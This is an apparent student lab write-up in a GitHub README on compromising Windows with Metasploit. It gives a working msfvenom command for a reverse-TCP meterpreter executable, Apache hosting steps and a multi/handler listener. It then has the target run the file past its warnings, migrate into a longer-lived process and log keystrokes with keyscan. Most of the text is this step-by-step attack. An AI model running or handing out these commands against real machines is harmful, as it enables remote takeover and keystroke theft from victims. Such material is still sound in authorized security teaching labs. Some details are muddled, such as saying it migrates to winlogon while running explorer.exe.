# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

OUTPUT:
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/d7fade46-cb1b-40c1-a161-675d4fb4bb12)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

OUTPUT
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/55c239b2-c818-4438-8c65-21181391fa61)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/3d7b6ed8-02f4-4b04-a308-f90ec8ab4fae)
Start apache server sudo systemctl apache2 start
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/6f3ff385-fe6d-4c46-8e5a-8e2692d1403f)

Check the status of apache2 
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/e7370c56-e37b-4b50-8d00-65cabb57384b)

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/16f206a8-f53a-405e-928a-2e110b9b028a)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/7df213f9-1b4e-4ae4-9a3c-af1236a562b3)
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/d78348ed-fc3b-4d46-a410-60b6831857dd)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/01189a06-d9c2-472d-a31e-3edafd71f149)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/f867d014-36d0-4a80-9e12-de30d7055eac)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/7e2b80f1-b23b-4608-99d4-c0a1a8c9a478)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Poojithamanohar/Compromising-windows-using-Metasploit/assets/119423592/22477056-c34c-4529-b5cc-e9f4dbe0d816)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
